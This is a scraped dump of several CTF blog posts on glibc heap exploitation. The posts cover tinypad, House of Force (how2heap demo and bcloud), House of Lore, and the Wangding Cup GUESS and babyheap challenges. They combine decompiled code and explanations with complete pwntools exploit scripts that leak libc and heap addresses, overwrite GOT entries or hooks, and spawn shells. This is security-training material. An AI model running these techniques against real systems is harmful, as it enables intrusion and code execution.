writeln(tinypad, v6); write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL); v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]); read_until(tinypad, v7, &apos;\\n&apos;); writeln(&quot;Is it OK?&quot;, 9LL); write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL); read_until((char *)&amp;c, 1uLL, &apos;\\n&apos;); &#125; strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad); writeln(&quot;\\nEdited.&quot;, 8LL); &#125; &#123; if ( cmd != &apos;A&apos; ) goto LABEL_43; while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] ) ++idx; if ( idx == 4 ) &#123; writeln(&quot;No space is left.&quot;, 17LL); &#125; else &#123; size = -1; write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL); size = read_int(); if ( size &lt;= 0 ) &#123; v5 = 1; &#125; else &#123; v5 = size; if ( (unsigned __int64)size &gt; 0x100 ) v5 = 256; &#125; size = v5; // max size =256 *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size); if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位 &#123; writerrln(&quot;[!] No memory is available.&quot;, 27LL); exit(-1); &#125; write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL); read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu); writeln(&quot;\\nAdded.&quot;, 7LL); &#125; &#125; &#125; while ( cnt != 81 ); return 0;&#125; 思路因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题 再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from pwn import * p = process(&quot;./tinypad&quot;)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &apos;debug&apos; def add(size, content): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;A&quot;) p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;) p.sendline(str(size)) p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;) p.sendline(content) def delete(index): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;D&quot;) p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;) p.sendline(str(index)) def edit(index, content, ok=True): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;E&quot;) p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;) p.sendline(str(index)) p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;) p.sendline(content) p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;) if ok: p.sendline(&quot;Y&quot;) else: p.sendline(&quot;n&quot;) #stage oneadd(0x80, &quot;A&quot;*0x80)add(0x80, &quot;B&quot;*0x80)add(0x80, &quot;C&quot;*0x80)add(0x80, &quot;D&quot;*0x80)delete(3)delete(1) p.recvuntil(&quot; # INDEX: 1\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)heap = u64(p.recvline().rstrip().ljust(8, &quot;\\x00&quot;)) - 0x120log.info(&quot;heap_base: %s&quot; % hex(heap))p.recvuntil(&quot; # INDEX: 3\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)main_arena = u64(p.recv(6).ljust(8, &quot;\\x00&quot;)) - 0x58log.info(&quot;main_arena: %s&quot; % hex(main_arena)) delete(2)delete(4) #stage twoadd(0x18, &quot;A&quot;*0x18)add(0x100, &quot;B&quot;*0xf8 + p64(0x11))add(0x100, &quot;C&quot;*0xf8)add(0x100, &quot;D&quot;*0xf8) tinypad = 0x602040offset = heap + 0x20 - 0x602040 - 0x20fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2 edit(3, &quot;D&quot;*0x20 + fake_chunk)zero_byte_number = 8 - len(p64(offset).strip(&quot;\\x00&quot;))for i in range(zero_byte_number+1): data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\\x00&quot;).rjust(8-i, &apos;f&apos;) edit(1, data) delete(2)edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2) #gdb.attach(p) #stage threelibc_base = main_arena + 0x58 - 0x3c4b78log.info(&quot;libc_base: %s&quot; % hex(libc_base))one_gadget = libc_base + 0x45216environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;] add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148)) p.recvuntil(&quot; # INDEX: 1\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\\x00&quot;)) - 0x8*30log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))edit(2, p64(main_ret))edit(1, p64(one_gadget))#gdb.attach(p)p.recv()p.sendline(&apos;Q&apos;)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.7-HouseOfForce","slug":"introduction-to-pwn2-7-houseofforce","date":"2019-01-22T11:42:55.000Z","updated":"2019-01-24T09:41:48.321Z","comments":true,"path":"2019/01/22/introduction-to-pwn2-7-houseofforce/","link":"","permalink":"http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-7-houseofforce/","excerpt":"","text":"House of Force 原理一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。 我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff，比较时会转化为无符号数），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。 所以最起码需要： 能够溢出至topchunk的size位 能够自由控制malloc大小 使用how2heap的例子来解释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123; fprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;); fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;); fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot; &quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;); fprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var); fprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var); fprintf(stderr, &quot;\\nLet&apos;s allocate the first chunk, taking space from the wilderness.\\n&quot;); intptr_t *p1 = malloc(256); fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - sizeof(long)*2); fprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;); int real_size = malloc_usable_size(p1); fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2); fprintf(stderr, &quot;\\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top); fprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;); fprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot; &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot; &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;); /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot; &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;); fprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk); fprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;); fprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var); fprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;); strcpy(ctr_chunk, &quot;YEAH!!!&quot;); fprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var); // some further discussion:// fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;);// fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;// &quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;);// fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;);// fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;);// fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;// &quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;);// fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2);// fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address);// fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);&#125; 运行效果： 123456789101112131415161718192021222324252627282930313233343536Welcome to the House of ForceThe idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.In the end, we will use this to overwrite a variable at 0x602060.Its current value is: This is a string that we want to overwrite.Let&apos;s allocate the first chunk, taking space from the wilderness.The chunk of 256 bytes has been allocated at 0xd61f90.Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.Real size (aligned and all that jazz) of our allocated chunk is 280.Now let&apos;s emulate a vulnerability that can overwrite the header of the Top ChunkThe top chunk starts at 0xd62110Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.Old size of top chunk 0x20ef1New size of top chunk 0xffffffffffffffffThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.Next, we will allocate a chunk that will get us right up against the desired region (with an integeroverflow) and will then be able to allocate a chunk right over the desired region.The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,we will malloc 0xffffffffff89ff30 bytes.As expected, the new pointer is at the same place as the old top chunk: 0xd62110Now, the next chunk we overwrite will point at our target buffer.malloc(100) =&gt; 0x602060!Now, we can finally overwrite that value:... old string: This is a string that we want to overwrite.... doing strcpy overwrite with &quot;YEAH!!!&quot;...... new string: YEAH!!! 原理可以参考：https://bbs.pediy.com/thread-222924.htm bcloud回家做的第一道，看了半天没看出来漏洞。。。name的输出函数被漏掉了。。 题目刚进去要输入name 12345678910111213141516unsigned int get_name()&#123; char s; // [esp+1Ch] [ebp-5Ch] char *name_; // [esp+5Ch] [ebp-1Ch] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); memset(&amp;s, 0, 0x50u); puts(&quot;Input your name:&quot;); read_str((int)&amp;s, 0x40, &apos;\\n&apos;); name_ = (char *)malloc(0x40u); name_ptr = (int)name_; strcpy(name_, &amp;s); puts_(name_); return __readgsdword(0x14u) ^ v3;&#125; 之后要输入Org &amp; Host,漏洞的主力。。。 1234567891011121314151617181920212223unsigned int get_org_host()&#123; char org; // [esp+1Ch] [ebp-9Ch] char *o; // [esp+5Ch] [ebp-5Ch] int host; // [esp+60h] [ebp-58h] char *h; // [esp+A4h] [ebp-14h] unsigned int v5; // [esp+ACh] [ebp-Ch] v5 = __readgsdword(0x14u); memset(&amp;org, 0, 0x90u); puts(&quot;Org:&quot;); read_str((int)&amp;org, 0x40, &apos;\\n&apos;); puts(&quot;Host:&quot;); read_str((int)&amp;host, 0x40, &apos;\\n&apos;); h = (char *)malloc(0x40u); o = (char *)malloc(0x40u); org_ptr = (int)o; host_ptr = (int)h; strcpy(h, (const char *)&amp;host); strcpy(o, &amp;org); &lt;------strcpy这里出的问题 puts(&quot;OKay! Enjoy:)&quot;); return __readgsdword(0x14u) ^ v5;&#125; 进去之后就是一个创建编辑删除同步note的程序，show，syn，quit没什么用 new_note: 1234567891011121314151617181920212223int new_note()&#123; int result; // eax signed int i; // [esp+18h] [ebp-10h] int length; // [esp+1Ch] [ebp-Ch] for ( i = 0; i &lt;= 9 &amp;&amp; ptr[i]; ++i ) //最多十个 ; if ( i == 10 ) return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;); puts(&quot;Input the length of the note content:&quot;); length = get_num(); ptr[i] = (int)malloc(length + 4); //大小用户定义 if ( !ptr[i] ) exit(-1); len_[i] = length; puts(&quot;Input the content:&quot;); read_str(ptr[i], length, &apos;\\n&apos;); printf(&quot;Create success, the id is %d\\n&quot;, i); result = i; syn_inuse[i] = 0; return result;&#125; edit 12345678910111213141516171819int edit()&#123; int v1; // ST1C_4 int i; // [esp+14h] [ebp-14h] int id_ptr; // [esp+18h] [ebp-10h] puts(&quot;Input the id:&quot;); i = get_num(); if ( i &lt; 0 || i &gt; 9 ) return puts(&quot;Invalid ID.&quot;); id_ptr = ptr[i]; if ( !id_ptr ) return puts(&quot;Note has been deleted.&quot;); v1 = len_[i]; syn_inuse[i] = 0; puts(&quot;Input the new content:&quot;); read_str(id_ptr, v1, &apos;\\n&apos;); return puts(&quot;Edit success.&quot;);&#125; delete 1234567891011121314151617int delete()&#123; int i; // [esp+18h] [ebp-10h] void *ptr_; // [esp+1Ch] [ebp-Ch] puts(&quot;Input the id:&quot;); i = get_num(); if ( i &lt; 0 || i &gt; 9 ) return puts(&quot;Invalid ID.&quot;); ptr_ = (void *)ptr[i]; if ( !ptr_ ) return puts(&quot;Note has been deleted.&quot;); ptr[i] = 0; len_[i] = 0; free(ptr_); return puts(&quot;Delete success.&quot;);&#125; 思路主程序看了一遍又一遍，还是没发现任何漏洞。回头看，问题出现在前面： name是用read读取的，结尾没有’\\x00’;而输出是以读取到’\\x00’为止的，那么就可以泄露堆地址。(ps: 大概是在strcpy到指定大小的地址时，如果写入大小与目标地址大小相同，则在后面会添加目标地址的指针。具体原因目前未明) org &amp; host 这边的strcpy操作会自动在结尾加’\\n’,结果就是在一通复制完之后，可以修改topchunk的size使之变为0xffffffff，满足houseofforce条件 之后进入程序。 计算大小将topchunk调整到bss段的len[]及ptr[]附近，欺骗程序chunk的分配。之后的思路在exp中写的很清楚 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level =&apos;debug&apos;sh = process(&apos;./bcloud&apos;)elf = ELF(&apos;./bcloud&apos;)libc = ELF(&apos;libc-2.19.so&apos;)#-----------get heap_base------------sh.recvuntil(&apos;Input your name:\\n&apos;)sh.send(&apos;a&apos;*64)#gdb.attach(sh)sh.recvuntil(&apos;a&apos;*64)heap_base = u32(sh.recv()[:4])-8print &apos;heap_base: &apos;+hex(heap_base)#---------house of force----------------!!!!!!!!!!sh.send(&apos;b&apos;*0x40)#sh.recvuntil(&apos;Host:&apos;)sh.sendline(p32(0xffffffff))#b(0x8048978)#gdb.attach(sh)#,&apos;b&apos; *0x804895e)#------------calc malloc size----------------!!!!!!!!!!!!topchunk_addr = heap_base + 0xd8print &apos;topchunk_addr: &apos;+hex(topchunk_addr)len_addr = 0x0804b0a0list_addr = 0x0804b120target_addr = len_addr - 8size = target_addr - topchunk_addr-4-7print str(size)#----------edit topchunk to size[i]--------------sh.recvuntil(&apos;option---&gt;&gt;\\n&apos;)sh.sendline(&apos;1&apos;)#sh.recv()sh.sendline(str(size-4))sh.recv()sh.send(&apos;\\n&apos;)#gdb.attach(sh)#--------------edit ptr to got_addr---------------payload = p32(16) *3 + (list_addr-len_addr-12)*&apos;a&apos;payload += p32(elf.got[&apos;free&apos;]) +p32( elf.got[&apos;atoi&apos;])*2#+elf.got[&apos;atoi&apos;] sh.sendline(&apos;1&apos;)#sh.recv()sh.sendline(&apos;1000&apos;)sh.recv()sh.sendline(payload)#gdb.attach(sh)#sh.recv()sh.sendline(&apos;3&apos;)sh.sendline(&apos;0&apos;)sh.recv()sh.sendline(p32(elf.plt[&apos;puts&apos;]))#---------leak atoi_addr to get system_addr-----------------sh.sendline(&apos;4&apos;)sh.recv()sh.sendline(&apos;1&apos;)#gdb.attach(sh)atoi_plt = sh.recv()[:4]#sh.recv()system_addr = u32(atoi_plt) - libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]print &apos;system_addr: &apos;+hex(system_addr)#gdb.attach(sh)#-------------edit atoi to system------------------sh.sendline(&apos;3&apos;)sh.sendline(&apos;2&apos;)sh.recv()sh.sendline(p32(system_addr))#gdb.attach(sh)#--------------------- get shell------------------sh.sendlineafter(&apos;option---&gt;&gt;&apos;, &apos;/bin/sh\\x00&apos;)#sh.send(&apos;/bin/sh\\x00&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.6-HouseOfLore","slug":"introduction-to-pwn2-6-houseoflore","date":"2019-01-22T09:33:51.000Z","updated":"2019-01-22T09:43:37.326Z","comments":true,"path":"2019/01/22/introduction-to-pwn2-6-houseoflore/","link":"","permalink":"http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-6-houseoflore/","excerpt":"","text":"House of Lore 原理看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。 house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。 单拿例子说一下吧，有对应的练习之后再加： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct small_chunk &#123; size_t prev_size; size_t size; struct small_chunk *fd; struct small_chunk *bk; char buf[0x64]; // chunk falls in smallbin size range&#125;;struct small_chunk fake_chunk; // At address 0x7ffdeb37d050struct small_chunk another_fake_chunk;struct small_chunk *real_chunk;unsigned long long *ptr, *victim;int len;len = sizeof(struct small_chunk);// Grab two small chunk and free the first one// This chunk will go into unsorted binptr = malloc(len); // points to address 0x1a44010// The second malloc can be of random size. We just want that// the first chunk does not merge with the top chunk on freeingmalloc(len); // points to address 0x1a440a0// This chunk will end up in unsorted binfree(ptr);real_chunk = (struct small_chunk *)(ptr - 2); // points to address 0x1a44000// Grab another chunk with greater size so as to prevent getting back// the same one. Also, the previous chunk will now go from unsorted to// small binmalloc(len + 0x10); // points to address 0x1a44130// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk// This will insert the fake chunk in the smallbinreal_chunk-&gt;bk = &amp;fake_chunk;// and fake_chunk&apos;s fd point to the small chunk// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunkfake_chunk.fd = real_chunk;// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunkfake_chunk.bk = &amp;another_fake_chunk;another_fake_chunk.fd = &amp;fake_chunk;// Remove the real chunk by a standard call to mallocmalloc(len); // points at address 0x1a44010// Next malloc for that size will return the fake chunkvictim = malloc(len); // points at address 0x7ffdeb37d060 注释已经说得很清楚了，就不再赘述了","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"网鼎杯pwn复现","slug":"网鼎杯pwn复现","date":"2018-12-28T11:20:12.000Z","updated":"2018-12-30T06:18:30.806Z","comments":true,"path":"2018/12/28/网鼎杯pwn复现/","link":"","permalink":"http://siriuswhiter.tk/2018/12/28/网鼎杯pwn复现/","excerpt":"","text":"第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。现在在学习堆的中间回来看看有没有能力去复现当时的题。 GUESS题目还是比较清晰的，将flag.txt的内容读到了栈上，我们就是想方设法将其输出出来； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 i; // [rsp+20h] [rbp-80h] __int64 max_num_3; // [rsp+28h] [rbp-78h] char flag_is_here; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 canary; // [rsp+98h] [rbp-8h] canary = __readfsqword(0x28u); max_num_3 = 3LL; LODWORD(stat_loc.__uptr) = 0; i = 0LL; setvbuf_and_alarm(); HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(&quot;./flag.txt&quot;); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;flag_is_here, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); // read flag.txt // // // // puts(&quot;This is GUESS FLAG CHALLENGE!&quot;); while ( 1 ) &#123; if ( i &gt;= max_num_3 ) &#123; puts(&quot;you have no sense... bye :-) &quot;); return 0LL; &#125; v5 = get_fork(); if ( !v5 ) break; ++i; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(&quot;Please type your guessing flag&quot;); gets(&amp;s2); if ( !strcmp(&amp;flag_is_here, &amp;s2) ) puts(&quot;You must have great six sense!!!! :-o &quot;); else puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;); return 0LL;&#125; 分析程序有canary，溢出点也很清晰；这里就涉及到了canary的ssp leak；因为只有三次机会，我们需要的就是栈地址；所以第一次得到libc地址，第二次可以用environ变量得到栈地址，第三次读flag即可。 当时卡住的地方是栈地址的泄露： 栈的地址可以通过libc中的一个变量 _environ变量泄露出来。因为在libc中的全局变量 environ储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，进而计算出flag在栈上的地址。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./GUESS&apos;)libc = ELF(&apos;./libc.so.6&apos;)puts_got = 0x602020sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(puts_got)*0x100)sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)gdb.attach(sh)puts_addr = u64(sh.recvn(6).ljust(8,&apos;\\x00&apos;))libc.address = puts_addr- libc.symbols[&apos;puts&apos;]environ = libc.symbols[&apos;environ&apos;]sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(environ)*0x100)sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)#gdb.attach(sh)stack_addr = u64(sh.recvn(6).ljust(8,&apos;\\x00&apos;))sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(stack_addr -0x168)*0x100)sh.interactive()结果如下：You should take more effort to get six sence, and one more challenge!!*** stack smashing detected ***: flag&#123;Th1s_1S_Fl3g&#125;me terminated babyheap题目题目写的还是比较清晰的，功能如下 123456789int menu()&#123; puts(&quot;1.alloc&quot;); puts(&quot;2.edit&quot;); puts(&quot;3.show&quot;); puts(&quot;4.free&quot;); puts(&quot;5.exit&quot;); return printf(&quot;Choice:&quot;);&#125; alloc 会分配固定0x30大小的chunk，最多alloc 9次；edit 可以选择修改chunk，最多edit 3次 ， 与alloc均不存在溢出的可能；show 会将内容打印出来；free 将chunk free掉，有明显的UAF漏洞。 1234567$ checksec babyheap[*] &apos;/home/sirius/tikool/wangdingbei/babyheap/babyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 分析保护基本上全开，为了拿到shell，我们选择修改malloc_hook或free_hook来执行system(‘/bin/sh’)或使用one_gadget拿shell； 为了能够修改free_hook,我们需要leak libc的基址，但是程序只会固定malloc(0x20),也就是0x30大小的chunk，该chunk属于fastbin，而众所周知，fastbin是没办法泄露libc基址的，因此我们需要smallbin； 为了能够搞到smallbin，我们决定利用free的漏洞，当连续free两个chunk时，后free的fastbin的fd指针会指向先free的chunk，然后我们show便可以泄露堆地址； 当泄露出堆地址之后，我们可以修改fd指针的指向地址，这样malloc时便会到我们想要的地址，所以我们有机会来让修改chunk能够使其去伪造smallbin大小的chunk，这样想方设法将其free之后，其fd指针与bk指针指向&lt;main_arena+88&gt;处，这样show便可以泄露libc地址。 不过最终要控制malloc 与 edit的次数，在有限的次数内完成功能， 不得已的话再想办法修改edit的次数限制。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc.so.6&apos;)def Add(index, data): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index)) p.recvuntil(&apos;Content:&apos;) p.send(data)def Edit(index, data): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index)) p.recvuntil(&apos;Content:&apos;) p.send(data)def Show(index): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index))def Delete(index): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index))Add(0,&apos;aaaaaaaa\\n&apos;)Add(1,&apos;bbbbbbbb\\n&apos;)Add(2,&apos;cccccccc\\n&apos;)Add(3,&apos;dddddddd\\n&apos;)#--------------leak heap addr----------------Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))Add(5, p64(0x30) + p64(0x30) + &apos;\\n&apos;)Delete(1)Delete(0)Show(0)heap_addr = u64(p.recvline()[ : -1].ljust(8, &apos;\\x00&apos;)) - 0x30print &quot;heap_addr: &quot; + hex(heap_addr)``pwndbg&gt; x/10gx 0x0000000000602060 &lt;---chunk_ptr 0-50x602060: 0x00000000011e2010 0x00000000011e20400x602070: 0x00000000011e2070 0x00000000011e20a00x602080: 0x00000000011e20d0 0x00000000011e21000x602090: 0x0000000000000000 0x00000000000000000x6020a0: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/40gx 0x000000000011e20000x11e2000: 0x0000000000000000 0x00000000000000310x11e2010: 0x00000000011e2030 &lt;--- get heap addr 0x00000000000000000x11e2020: 0x0000000000000000 0x00000000000000000x11e2030: 0x0000000000000000 0x00000000000000310x11e2040: 0x0000000000000000 0x00000000000000000x11e2050: 0x0000000000000000 0x00000000000000000x11e2060: 0x0000000000000000 0x00000000000000310x11e2070: 0x6363636363636363 0x00000000000000000x11e2080: 0x0000000000000000 0x00000000000000000x11e2090: 0x0000000000000000 0x00000000000000310x11e20a0: 0x6464646464646464 0x00000000000000000x11e20b0: 0x0000000000000000 0x00000000000000000x11e20c0: 0x0000000000000000 0x00000000000000310x11e20d0: 0x00000000000000a0 0x00000000000000310x11e20e0: 0x0000000000602068 0x00000000006020700x11e20f0: 0x0000000000000000 0x00000000000000310x11e2100: 0x0000000000000030 0x00000000000000300x11e2110: 0x0000000000000000 0x00000000000000000x11e2120: 0x0000000000000000 0x0000000000020ee10x11e2130: 0x0000000000000000 